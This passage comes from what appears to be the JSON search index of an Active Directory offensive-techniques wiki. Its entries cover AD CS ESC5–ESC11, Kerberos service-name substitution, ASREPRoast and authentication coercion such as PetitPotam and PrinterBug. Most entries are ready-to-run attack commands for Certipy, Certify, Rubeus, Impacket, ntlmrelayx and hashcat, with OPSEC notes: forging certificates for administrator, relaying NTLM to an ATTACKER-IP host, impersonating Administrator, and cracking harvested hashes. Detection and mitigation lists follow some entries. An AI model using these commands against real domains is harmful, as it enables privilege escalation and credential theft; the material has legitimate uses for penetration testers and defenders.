exploitation, disable the template\ncertutil -config \"CA-NAME\\domain-DC-CA\" -template -VulnTemplate\n</code></pre></p> <p>Linux (Remote): <pre><code># Enumerate CA permissions\ncertipy find -u user@domain.local -p Password123 -dc-ip 10.10.10.10 -ca\n\n# If manage CA permission, enable vulnerable template:\ncertipy ca -u user@domain.local -p Password123 -ca 'CA-NAME' -enable-template 'VulnTemplate'\n\n# After exploitation, disable the template\ncertipy ca -u user@domain.local -p Password123 -ca 'CA-NAME' -disable-template 'VulnTemplate'\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc5-vulnerable-certificate-authority-enrollment-access-control","title":"ESC5: Vulnerable Certificate Authority Enrollment Access Control","text":"<p>Vulnerability: Certificate Authority with dangerous enrollment policies</p> <p>[!NOTE] Prerequisites: Write permissions on CA enrollment policies.</p> <p>Caution: Modifying enrollment policies may disrupt legitimate certificate operations.</p> <p>Exploitation: Similar to ESC4, focuses on enrollment access controls rather than management access controls.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc6-editf_attributesubjectaltname2-flag-set","title":"ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Set","text":"<p>Vulnerability: CA configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing subject alternative name manipulation</p> <p>[!NOTE] Prerequisites: The CA must have the EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled.</p> <p>Detection Risk: This attack doesn't modify settings but can create detectable certificate requests.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Check if flag is enabled using certutil\ncertutil -config \"CA-NAME\\domain-DC-CA\" -getreg policy\\EditFlags\n# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) in the flags\n\n# Using Certify\nCertify.exe request /ca:CA-NAME /template:User /altname:administrator\n</code></pre></p> <p>Linux (Remote): <pre><code># Check if flag is enabled\ncertipy find -u user@domain.local -p Password123 -ca\n\n# Request certificate with alternative name\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'User' -san 'administrator@domain.local'\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc7-vulnerable-certificate-authority-enrollment-service-access-control","title":"ESC7: Vulnerable Certificate Authority Enrollment Service Access Control","text":"<p>Vulnerability: Misconfigured access controls on the web enrollment service</p> <p>[!NOTE] Prerequisites:  - Web enrollment must be enabled - User must have enrollment permissions</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify to check web enrollment\nCertify.exe find\n\n# Typically requires manual exploitation via browser\n# Navigate to https://ca-server/certsrv/\n# Request certificate &gt; advanced certificate request &gt; submit PKCS #10 request\n</code></pre></p> <p>Linux (Remote): <pre><code># Enumerate web enrollment permissions\ncertipy find -u user@domain.local -p Password123 -web-enrollment\n\n# If vulnerable, generate certificate request and submit via the enrollment service\n# This may require custom scripting to interact with the web enrollment interface\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc8-ntlm-relay-to-active-directory-certificate-services-web-enrollment","title":"ESC8: NTLM Relay to Active Directory Certificate Services Web Enrollment","text":"<p>Vulnerability: NTLM authentication on the Certificate Enrollment Web Service can be relayed</p> <p>[!WARNING] Prerequisites:  - Web enrollment must use NTLM authentication - No EPA (Extended Protection for Authentication) - No HTTPS enforced</p> <p>Impact: Requires triggering NTLM authentication from a privileged account, which may create logs and alerts.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># From Windows, you typically need multiple tools\n# 1. Set up Inveigh for NTLM capturing and relaying\nImport-Module .\\Inveigh.ps1\nInveigh-Relay -ConsoleOutput Y -Target http://adcs.domain.local/certsrv/ -Attack ADCS\n\n# 2. Coerce authentication from a target\n# Using SpoolSample, PetitPotam, or other authentication coercion technique\n.\\PetitPotam.exe -d domain.local -u user -p password ATTACKER-IP DC-IP\n</code></pre></p> <p>Linux (Remote): <pre><code># Set up relay attack with ntlmrelayx\nntlmrelayx.py -t http://adcs.domain.local/certsrv/ -smb2support --adcs\n\n# Coerce authentication from target using Impacket tools\n# Using PetitPotam (MS-EFSRPC) coercion\nimpacket-petitpotam -d domain.local -u user -p password ATTACKER-IP DC-IP\n\n# Or using PrinterBug (MS-RPRN) coercion\nimpacket-printerbug domain.local/user:password@DC-IP ATTACKER-IP\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc9-no-security-extension","title":"ESC9: No Security Extension","text":"<p>Vulnerability: Templates without security extensions allowing for certificate misuse</p> <p>[!NOTE] Prerequisites: Access to templates without proper security extensions.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify\nCertify.exe find /vulnerable\n\n# Request certificate from vulnerable template\nCertify.exe request /ca:CA-NAME /template:VulnTemplate\n\n# Use for unintended authentication scenarios\n</code></pre></p> <p>Linux (Remote): <pre><code># Request certificate without security extensions\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'VulnTemplate'\n\n# Use for unintended authentication scenarios\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc10-certificate-authority-configuration-disclosure","title":"ESC10: Certificate Authority Configuration Disclosure","text":"<p>Vulnerability: Disclosure of CA configuration information to unprivileged users</p> <p>[!NOTE] Prerequisites: Network access to the CA.</p> <p>Impact: Passive information gathering only, no system changes.</p> <p>Exploitation: Information gathered can be used to identify other vulnerabilities and aid in attacks.</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#esc11-subject-alternative-name-untrusted-values","title":"ESC11: Subject Alternative Name Untrusted Values","text":"<p>Vulnerability: Certain certificate fields are not properly validated</p> <p>[!NOTE] Prerequisites: Access to templates that don't properly validate SAN fields.</p> <p>Detection Risk: Creates certificate requests that may be logged and detected.</p> <p>Exploitation:</p> <p>Windows (Local): <pre><code># Using Certify\nCertify.exe request /ca:CA-NAME /template:User /altname:administrator\n</code></pre></p> <p>Linux (Remote): <pre><code># Request certificate with manipulated alternative name values\ncertipy req -u user@domain.local -p Password123 -ca 'CA-NAME' -template 'User' -san 'administrator@domain.local'\n</code></pre></p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#detection","title":"Detection","text":"<ul> <li>Monitor certificate issuance, especially for sensitive principals</li> <li>Look for unusual certificate request patterns</li> <li>Audit certificate template modifications</li> <li>Monitor for the use of certificates for authentication</li> <li>Watch for changes to CA configuration settings</li> <li>Review logs for suspicious certificate enrollments</li> </ul>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/adcs_vulnerabilities/#mitigation","title":"Mitigation","text":"<p>General Mitigations: - Apply the principle of least privilege to CA and template permissions - Require manager approval for sensitive certificate templates - Implement proper access controls on certificate enrollment - Use strong authentication for certificate enrollment - Regularly audit certificate templates and CA configurations</p> <p>ESC1-specific: - Remove the ENROLLEE_SUPPLIES_SUBJECT flag from templates - Restrict enrollment rights to necessary groups only - Disable vulnerable templates</p> <p>ESC2-specific: - Review and restrict ACLs on certificate templates - Remove unnecessary write permissions - Implement approval requirements for template modifications</p> <p>ESC3-specific: - Restrict enrollment agent templates to necessary users only - Require manager approval for certificates issued by enrollment agents - Monitor the use of enrollment agent certificates</p> <p>ESC4/ESC5-specific: - Review and restrict ACLs on the CA - Monitor for changes to CA configuration - Implement approval workflows for CA modifications</p> <p>ESC6-specific: - Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA - If the flag is required, implement additional validation</p> <p>ESC7-specific: - Restrict access to web enrollment interfaces - Implement strong authentication for web enrollment - Use certificate enrollment policies</p> <p>ESC8-specific: - Enable Extended Protection for Authentication (EPA) - Require HTTPS for certificate enrollment - Implement SMB signing and LDAP signing - Disable NTLM where possible and use Kerberos</p> <p>ESC9-specific: - Ensure all templates include appropriate security extensions - Review certificate usage in the environment - Implement certificate issuance policies</p> <p>ESC10-specific: - Restrict access to CA configuration information - Implement proper information disclosure controls - Use access control to limit who can query CA configurations</p> <p>ESC11-specific: - Validate all certificate fields properly - Implement proper input validation for certificate requests - Use application policies to restrict certificate usage</p>","tags":["#type/technique","#tactic/TA0004","#technique/T1068","#stage/privilege-escalation","#os/windows","#service/pki","#tool/certipy","#tool/certify"]},{"location":"Active%20Directory/flat/alternate_service_name/","title":"Alternate service name","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#technique","title":"Technique","text":"<p>The Alternate Service Name attack (also known as Service Principal Name Substitution) exploits a design feature in Kerberos where the service principal name (SPN) in a service ticket is not encrypted or integrity-protected. This allows an attacker to modify the service name field in a valid Kerberos ticket to access services that weren't originally authorized.</p> <p>This technique works because when a service validates a Kerberos ticket, it only checks: 1. That the ticket was encrypted with its own key 2. That the target computer name matches</p> <p>However, it doesn't verify that the service type (e.g., CIFS, LDAP, HOST) in the ticket matches the service it's actually providing. This allows for \"service substitution\" where a ticket for one service (e.g., CIFS) can be modified to access another service (e.g., LDAP) on the same machine.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Depends on the approach, but generally requires: - A valid TGT for a service account with delegation rights, OR - Access to S4U2Self + S4U2Proxy techniques, OR - An existing service ticket that can be modified</p> <p>System State:  - The target system must have multiple services (e.g., CIFS, LDAP, HOST) running - The target service must not implement additional validation beyond standard Kerberos checks</p> <p>Information: Knowledge of available services on the target machine</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#considerations","title":"Considerations","text":"<p>Impact</p> <p>This attack allows lateral movement between different services on the same machine using a single service ticket. This is particularly powerful for privilege escalation when combined with constrained delegation, as it can bypass the service-type restrictions of the delegation.</p> <p>OPSEC</p> <ul> <li> <p>Ticket Anomalies: Some security monitoring solutions may flag tickets where the requested service (in logs) doesn't match the actual service being accessed.</p> </li> <li> <p>Service Mismatch: Accessing unusual service combinations might trigger alerts in environments with proper security monitoring.</p> </li> <li> <p>Unusual Authentication Patterns: Accessing services that a user or account doesn't typically use might be detected.</p> </li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#attack-scenarios","title":"Attack Scenarios","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#scenario-1-using-s4u2self-service-substitution","title":"Scenario 1: Using S4U2Self + Service Substitution","text":"<p>In this scenario, we have a compromised service account with constrained delegation rights, but the delegation is restricted to a less valuable service (e.g., CIFS). We can use S4U2Self to get a ticket and then modify it to access a more valuable service (e.g., LDAP).</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#scenario-2-direct-service-substitution","title":"Scenario 2: Direct Service Substitution","text":"<p>If we already have a service ticket for one service, we can modify it to access another service on the same machine.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#using-rubeus-windows","title":"Using Rubeus (Windows)","text":"<p>Scenario 1: S4U2Self + Service Substitution</p> <pre><code># Get a TGT for the service account\nRubeus.exe asktgt /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH /nowrap\n\n# Use S4U2Self with service substitution\nRubeus.exe s4u /user:SERVICE_ACCOUNT$ /ticket:BASE64_TGT \\\n    /impersonateuser:TARGET_USER /self /altservice:ldap/server.domain.local /ptt\n</code></pre> <p>Scenario 2: S4U2Proxy + Service Substitution</p> <pre><code># Full S4U2Self + S4U2Proxy + altservice in one command\nRubeus.exe s4u /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH \\\n    /impersonateuser:Administrator /msdsspn:cifs/server.domain.local \\\n    /altservice:ldap /ptt\n</code></pre> <p>Advanced usage with multiple alternate services</p> <pre><code># Request multiple alternate services in one command\nRubeus.exe s4u /user:SERVICE_ACCOUNT$ /domain:domain.local /rc4:NTLM_HASH \\\n    /impersonateuser:Administrator /msdsspn:cifs/server.domain.local \\\n    /altservice:ldap,host,http,wsman,rpcss /ptt\n</code></pre> <p>With explicit TGT</p> <pre><code># If you already have a TGT\nRubeus.exe s4u /ticket:BASE64_TGT /impersonateuser:Administrator \\\n    /msdsspn:cifs/server.domain.local /altservice:ldap/server.domain.local /ptt\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#using-impacket-linux","title":"Using Impacket (Linux)","text":"<p>Impacket doesn't directly support the alternate service name feature as Rubeus does, but you can use it to obtain service tickets and then manipulate them with other tools.</p> <pre><code># Get a TGT for the service account\ngetTGT.py -dc-ip DC_IP domain.local/SERVICE_ACCOUNT:PASSWORD\n\n# Get a service ticket for CIFS\ngetST.py -dc-ip DC_IP -spn cifs/server.domain.local \\\n    -impersonate Administrator domain.local/SERVICE_ACCOUNT -k\n\n# Use other tools to modify the SPN in the ticket\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#using-delegations-tool","title":"Using Delegations Tool","text":"<p>The Delegations tool can help you identify constrained delegation configurations that might be vulnerable to service substitution:</p> <pre><code># Find constrained delegations in the domain\n./Delegations find constrained --dc-ip DC_IP -d domain.local -u USER -p PASSWORD\n</code></pre> <p>After identifying vulnerable configurations, you can use Rubeus for the actual service substitution attack.</p>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#common-service-substitution-targets","title":"Common Service Substitution Targets","text":"Original Service Substitute Service Potential Impact CIFS LDAP Directory querying/modification CIFS HOST Remote command execution HTTP WSMAN PowerShell Remoting HTTP RPCSS RPC calls TIME LDAP Directory access Any KRBTGT Potential TGT request (rarely works)","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#real-world-examples","title":"Real-World Examples","text":"<p>Example 1: CIFS to LDAP Substitution</p> <pre><code># Obtain a ticket for CIFS but use it for LDAP\nRubeus.exe s4u /user:webserver$ /domain:domain.local /rc4:NTLM_HASH \\\n    /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local \\\n    /altservice:ldap /ptt\n\n# Then use the ticket for LDAP operations\nAdd-Type -AssemblyName System.DirectoryServices\n$ldap = New-Object System.DirectoryServices.DirectoryEntry\n$searcher = New-Object System.DirectoryServices.DirectorySearcher($ldap)\n$searcher.FindAll()\n</code></pre> <p>Example 2: TIME to HOST Substitution</p> <pre><code># Obtain a ticket for TIME but use it for HOST services\nRubeus.exe s4u /user:timeserver$ /domain:domain.local /rc4:NTLM_HASH \\\n    /impersonateuser:Administrator /msdsspn:time/target.domain.local \\\n    /altservice:host /ptt\n\n# Then use it for WMI operations\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName target.domain.local\n</code></pre>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#detection","title":"Detection","text":"<ul> <li>Monitor for discrepancies between requested service types and accessed services</li> <li>Look for unusual service ticket requests, especially from service accounts</li> <li>Implement security monitoring for sensitive service access (LDAP, HOST, etc.)</li> <li>Watch for service tickets being used for services not matching the original SPN</li> <li>Analyze authentication logs for anomalous service access patterns</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#mitigation","title":"Mitigation","text":"<ul> <li>Implement service-specific application-level authentication checks beyond Kerberos</li> <li>Use additional authentication factors for sensitive services</li> <li>Carefully review and limit constrained delegation configurations</li> <li>Mark sensitive accounts as \"Account is sensitive and cannot be delegated\"</li> <li>Place privileged accounts in the Protected Users group</li> <li>Follow the principle of least privilege for service accounts</li> <li>Regularly review and validate SPNs in your environment</li> <li>Configure network segmentation to restrict access to sensitive services</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/alternate_service_name/#technical-notes","title":"Technical Notes","text":"<ul> <li>The SPN field in Kerberos service tickets is not protected by the PAC (Privilege Attribute Certificate) checksum</li> <li>The primary limitation is that you can only substitute services on the same machine</li> <li>Some services may implement additional validation that can prevent this attack</li> <li>Microsoft considers this behavior a design feature rather than a vulnerability</li> <li>The attack is most effective when combined with constrained delegation</li> <li>Service substitution works because the service name is stored in the <code>sname</code> field of the ticket, which is not encrypted</li> <li>Windows Server 2022 and newer versions may have additional protections against certain service substitution scenarios</li> </ul>","tags":["#type/technique","#tactic/TA0008","#technique/T1558","#stage/lateral-movement","#os/windows","#protocol/kerberos","#tool/rubeus","#tool/impacket","#tool/delegations"]},{"location":"Active%20Directory/flat/asreproast/","title":"Asreproast","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#technique","title":"Technique","text":"<p>ASREPRoast targets user accounts that have the \"Do not require Kerberos pre-authentication\" setting enabled. This configuration allows an attacker to request authentication data for these users without providing any credentials. The resulting data can be subjected to offline cracking to reveal the user's password.</p> <p>When Kerberos pre-authentication is disabled, the Authentication Server (AS) responds with an AS-REP message that contains data encrypted with the user's password-derived key. This response can be requested without authentication and then subjected to offline password cracking.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#prerequisites","title":"Prerequisites","text":"<p>Access Level: No authentication required (can be performed anonymously)</p> <p>System State: The target Active Directory domain must have users with Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag set)</p> <p>Information: Knowledge of valid usernames in the domain or ability to enumerate them</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#identification","title":"Identification","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#remote-identification-unauthenticated","title":"Remote Identification (Unauthenticated)","text":"<p>Using NetExec (NXC): <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --query '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \"\"\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#local-identification-authenticated","title":"Local Identification (Authenticated)","text":"<p>Using ADSearch: <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName\n</code></pre></p> <p>Using built-in Windows tools: <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre></p> <p>Using PowerView: <pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#request-as-rep-tickets","title":"Request AS-REP Tickets","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#remote-execution","title":"Remote Execution","text":"<p>Using NetExec: <pre><code>nxc ldap &lt;IP&gt; -u '&lt;USER&gt;' -p '' --asreproast output.txt\n</code></pre></p> <p>Using Impacket: <pre><code>impacket-GetNPUsers domain.local/svc-test -no-pass\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#local-execution","title":"Local Execution","text":"<p>Using Rubeus: <pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap\n</code></pre></p> <p>Using PowerView: <pre><code>Get-ASREPHash -Username svc-test -verbose\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#crack-the-tickets","title":"Crack the Tickets","text":"<p>Using Hashcat: <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre></p> <p>Using John the Ripper: <pre><code>john --wordlist=&lt;wordlist&gt; hashes.txt\n</code></pre></p>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#detection","title":"Detection","text":"<ul> <li>Monitor for AS-REP requests that don't have corresponding AS-REQ messages</li> <li>Watch for account enumeration attempts against your domain controllers</li> <li>Look for multiple failed Kerberos authentication attempts from a single source</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/asreproast/#mitigation","title":"Mitigation","text":"<ul> <li>Ensure Kerberos pre-authentication is enabled for all user accounts (this is the default setting)</li> <li>Regularly audit user account properties for the DONT_REQ_PREAUTH flag</li> <li>Implement strong password policies to make offline cracking difficult</li> <li>Use a Group Policy Object to enforce Kerberos pre-authentication for all accounts</li> <li>Monitor and restrict anonymous LDAP queries in your environment</li> </ul>","tags":["#type/technique","#tactic/TA0006","#technique/T1558.004","#stage/initial-access","#protocol/kerberos","#os/windows","#tool/impacket","#tool/rubeus","#tool/nxc","#tool/hashcat"]},{"location":"Active%20Directory/flat/authentication_coercion/","title":"Authentication coercion","text":"","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#technique","title":"Technique","text":"<p>Authentication Coercion is a technique that forces Windows systems (typically servers or domain controllers) to initiate authentication to an attacker-controlled system. This coerced authentication can then be captured or relayed to access other services or systems.</p> <p>The attack exploits various Microsoft protocols and APIs that can be abused to trigger NTLM authentication, including: - MS-EFSRPC (Encrypting File System Remote Protocol) - PetitPotam - MS-RPRN (Print System Remote Protocol) - PrinterBug - MS-FSRVP (File Server Remote VSS Protocol) - ShadowCoerce - Many others across various Windows services</p> <p>These attacks are particularly dangerous when combined with NTLM relay attacks, especially against Active Directory Certificate Services (AD CS).</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#prerequisites","title":"Prerequisites","text":"<p>Access Level: Many coercion methods require network access but no authentication, though some methods require low-privilege authenticated access.</p> <p>System State:  - Target must have the vulnerable service or API enabled - NTLM authentication must be enabled in the environment - For effective exploitation via relay: SMB signing must be disabled on target systems</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#multi-method-coercion","title":"Multi-Method Coercion","text":"<p>Using Coercer</p> <p>Coercer attempts 12 different methods to coerce authentication:</p> <pre><code>python3 coercer.py coerce -l &lt;attackerIP&gt; -t &lt;targetIP&gt; -u 'user' -p 'pass' -d &lt;domain.local&gt; -v\n</code></pre>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#petitpotam-ms-efsrpc","title":"PetitPotam (MS-EFSRPC)","text":"<p>PetitPotam is one of the most reliable authentication coercion techniques, exploiting the Encrypting File System Remote Protocol.</p>","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#requirements","title":"Requirements","text":"Feature / Component Required for PetitPotam Required for Full Relay to DA via AD CS EFSRPC \u2705 Yes \u2705 Yes NTLM Enabled \u2705 Yes \u2705 Yes SMB/LDAP Signing Disabled \u2705 Yes (on relay target) \u2705 Yes (on certsrv or LDAP) AD CS Installed \u274c No \u2705 Yes Vulnerable AD CS Template \u274c No \u2705 Yes EPA / Channel Binding Off \u274c No \u2705 Yes","tags":["#type/technique","#tactic/TA0006","#technique/T1187","#stage/credential-access","#os/windows","#tool/netexec","#tool/impacket","#tool/coercer","#protocol/ntlm"]},{"location":"Active%20Directory/flat/authentication_coercion/#identification","title":"Identification","text":"<p>Using NetExec: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o METHOD=PetitPotam\n</code></pre></p> <p>Shorthand: <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M coerce_plus -o 